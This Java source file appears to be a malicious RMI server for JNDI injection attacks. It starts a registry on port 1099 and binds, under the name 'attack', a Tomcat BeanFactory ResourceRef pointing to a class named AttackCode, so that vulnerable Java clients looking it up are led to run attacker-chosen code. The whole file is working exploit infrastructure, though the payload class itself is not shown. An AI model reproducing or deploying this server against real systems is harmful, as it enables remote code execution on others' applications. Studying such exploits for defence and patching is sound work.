package com.example;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import org.apache.naming.ResourceRef;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RMIServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            ResourceRef ref = new ResourceRef("com.example.AttackCode", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
            registry.bind("attack", referenceWrapper);
            System.out.println("RMI server start");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}